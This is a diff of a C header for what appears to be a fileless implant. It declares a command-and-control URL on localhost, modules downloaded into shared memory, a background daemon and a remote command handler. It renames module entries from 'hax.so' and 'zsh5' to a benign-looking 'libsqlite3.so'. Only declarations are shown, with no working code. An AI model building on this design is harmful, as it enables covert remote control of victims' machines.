@@ -24,9 +24,7 @@ FILE *fp;
 
 // Initial modules to download to memory
 char *modules[] = {
-    "hax.so",
-    "libmctor.so",
-    "zsh5"
+    "libsqlite3.so"
 };
 //
 // HTTP/S C2
@@ -43,12 +41,14 @@ char *ccurl="http://127.0.0.1:8080/";
 typedef struct node {
     char mname[256];
     char mpath[1024];
+    int  fd;
     struct node * next;
 } node_t;
 
 typedef struct modtbl {
     char mname[256];
     char mpath[1024];
+    int  fd;
 } modtbl_t;
 node_t * head = NULL;
 
@@ -87,15 +87,21 @@ void cleanup(int);
 /*** 
  *  Functions
  ***/
-int  push(node_t * head, char* path, char * mname);
-int  push_first(node_t * head, char* path, char * mname);
-int  check_empty(node_t * head);
-int  list_sz(node_t * head);
-void write_modlist(node_t * head, int sock);
-int  load_mod(node_t * head, char * url);
-int  processCommandReq (int sock, node_t * head);
-int  backgroundDaemonLeader(void);
-int  setupCmdP(void);
+int   push(node_t * head, int shm_fd, char* path, char * mname);
+int   push_first(node_t * head, int shm_fd, char* path, char * mname);
+int   check_empty(node_t * head);
+int   list_sz(node_t * head);
+void  write_modlist(node_t * head, int sock);
+int   load_mod(node_t * head, char * url);
+int   unload_mod(node_t * head, char * name);
+int   delete_mod(node_t * head, int shm_fd);
+int   processCommandReq (int sock, node_t * head);
+int   backgroundDaemonLeader(void);
+int   setupCmdP(void);
+char* mod_name2path(node_t * head, char * name);
+int   mod_name2fd(node_t * head, char * name);
+void  load_so_path(char* path);
+void  doWork(void);
 
 
 #endif //_HAVE_ZAF_H
